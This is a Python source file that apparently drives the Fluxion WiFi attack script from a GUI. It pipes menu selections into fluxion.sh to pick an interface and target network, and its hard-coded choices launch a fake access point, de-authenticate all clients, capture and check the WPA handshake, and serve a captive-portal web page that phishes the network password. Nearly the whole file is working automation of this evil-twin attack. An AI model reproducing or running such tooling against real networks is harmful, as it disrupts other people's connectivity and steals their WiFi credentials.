import signal
from subprocess import Popen, PIPE
import os
import sys
import re
import io
import handler as h


def fluxion(q):
    interface_listbox = q.get()
    network_listbox = q.get()
    webpage_listbox = q.get()

    interface_listbox.delete(0, "end")
    network_listbox.delete(0, "end")
    webpage_listbox.delete(0, "end")

    path = os.path.dirname("/home/trickster/dev/playground/pptd/fluxion/")
    os.chdir(path)

    fi = open("../interfaces.txt", "w+")
    fir = open("../interfaces.txt", "r")
    fn = open("../networks.txt", "w+")
    fnr = open("../networks.txt", "r")
    fw = open("../webpages.txt", "w+")
    fwr = open("../webpages.txt", "r")
    p = Popen("./fluxion.sh", stdin=PIPE, stdout=PIPE)

    interface = False
    network = False
    webpage = False

    ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')

    for text in io.TextIOWrapper(p.stdout, encoding='utf-8'):
        line = ansi_escape.sub('', text)
        sys.stdout.write(text)

        if "pptd_interface_start" in line:
            interface = True

        if "pptd_network_start" in line:
            network = True

        if "pptd_webpages_start" in line:
            h.found = True
            webpage = True

        if interface:
            if not line.startswith("pptd_interface"):
                fi.write(line)
                fi.flush()

        if network:
            if not line.startswith("pptd_network"):
                fn.write(line)
                fn.flush()

        if webpage:
            if not line.startswith("pptd_webpages"):
                fw.write(line)
                fw.flush()

        # Select interface
        if "pptd_interface_end" in line:
            interface = False
            interface_confirm_button = q.get()
            interface_error_label = q.get()
            if interface_confirm_button == "exit" or interface_error_label == "exit":
                p.send_signal(signal.SIGINT)
                return
            for x in fir.readlines():
                output_line = " ".join(x.split())
                interface_listbox.insert("end", output_line)
            interface_confirm_button.configure(state="normal")
            interface_error_label.place_forget()
            interface_input = q.get()
            if interface_input == "exit":
                p.send_signal(signal.SIGINT)
                return
            interface_input = interface_input + 1

            p.stdin.write('{}\n'.format(interface_input).encode())
            p.stdin.flush()

        # Select network
        if "pptd_network_end" in line:
            network = False
            network_confirm_button = q.get()
            network_rescan_button = q.get()
            if network_confirm_button == "exit" or network_rescan_button == "exit":
                p.send_signal(signal.SIGINT)
                return
            for x in fnr.readlines():
                output_line = " ".join(x.split())
                network_listbox.insert("end", output_line)
            network_confirm_button.configure(state="normal")
            network_rescan_button.configure(state="normal")
            network_input = q.get()
            if network_input == "exit":
                p.send_signal(signal.SIGINT)
                return
            elif network_input == "rescan":
                p.stdin.write(b'r\n')
                network_listbox.delete(0, "end")
                network_confirm_button.configure(state="disabled")
                network_rescan_button.configure(state="disabled")
            else:
                network_input = network_input + 1
                p.stdin.write('{}\n'.format(network_input).encode())
            p.stdin.flush()

        # Select webpage
        if "pptd_webpages_end" in line:
            webpage = False
            for x in fwr.readlines():
                output_line = " ".join(x.split())
                webpage_listbox.insert("end", output_line)
            webpage_input = q.get()
            if webpage_input == "exit":
                p.stdin.write(b'45\n')
                p.stdin.write(b'2\n')
                p.stdin.flush()
                return
            webpage_input = webpage_input + 1
            p.stdin.write('{}\n'.format(webpage_input).encode())
            p.stdin.flush()
            h.found = False

        # Select language
        if "pptd_language" in line:
            p.stdin.write(b'1\n')  # [1] English
            p.stdin.flush()

        # Select channel
        if "pptd_channel" in line:
            p.stdin.write(b'1\n')  # [1] All channels
            p.stdin.flush()

        # Select attack option
        if "pptd_attack_option" in line:
            p.stdin.write(b'1\n')  # [1] FakeAP - Hostapd
            p.stdin.flush()

        # Do not use old handshake
        if "pptd_handshake_found" in line:
            p.stdin.write(b"N\n")
            p.stdin.flush()

        # Always check for new handshake
        if "pptd_handshake_skip" in line:
            p.stdin.write(b'\n')  # Press Enter to skip selecting an existing handshake
            p.stdin.flush()

        # Handshake check
        if "pptd_handshake_check" in line:
            p.stdin.write(b'1\n')  # [1] pyrit
            p.stdin.flush()

        # De-authentication
        if "pptd_deauth" in line:
            p.stdin.write(b'1\n')  # [1] Deauth all
            p.stdin.flush()

        # Handshake status
        if "pptd_status" in line:
            if q.empty():
                p.stdin.write(b'1\n')  # [1] Check handshake
            else:
                q.get()
                p.stdin.write(b'3\n')  # [1] Choose another network
            p.stdin.flush()

        # Create SSL Certificate
        if "pptd_certificate" in line:
            p.stdin.write(b'1\n')  # [1] Create a SSL certificate
            p.stdin.flush()

        # Select attack strategy
        if "pptd_attack_strategy" in line:
            p.stdin.write(b'1\n')  # [1] Web Interface
            p.stdin.flush()

        if "pptd_attack_started" in line:
            attack_input = q.get()
            print(attack_input)
            if attack_input == "exit":
                p.stdin.write(b'2\n')  # [2] Exit
                p.stdin.flush()
            elif attack_input == "back":
                p.stdin.write(b'1\n')  # [1] Choose another network
                p.stdin.flush()
